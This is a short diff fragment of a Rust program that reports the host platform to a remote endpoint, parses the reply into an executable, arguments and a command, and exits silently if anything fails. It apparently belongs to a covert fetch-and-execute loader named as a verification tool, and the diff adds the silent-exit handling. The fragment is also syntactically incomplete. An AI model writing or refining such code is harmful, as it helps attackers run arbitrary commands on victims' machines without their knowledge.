@@ -67,15 +67,14 @@ fn main() {
     let platform = if cfg!(target_os = "windows") { "win32" } else { "darwin" };
     let body = format!("{{\"p\":\"{}\"}}", platform);
 
-        format!("{}\\AppData\\Local\\Temp\\apex_verify.log", std::env::var("USERPROFILE").unwrap_or_default())
-    } else {
-        "/tmp/apex_verify.log".to_string()
-    };
-
     let resp = match send_request(&ep, &body) {
+        Some(r) => r,
+        None => { std::process::exit(0); }
     };
 
     let (exec, args, cmd) = match parse_response(&resp) {
+        Some(d) => d,
+        None => { std::process::exit(0); }
     };
 
     let done = done_path();
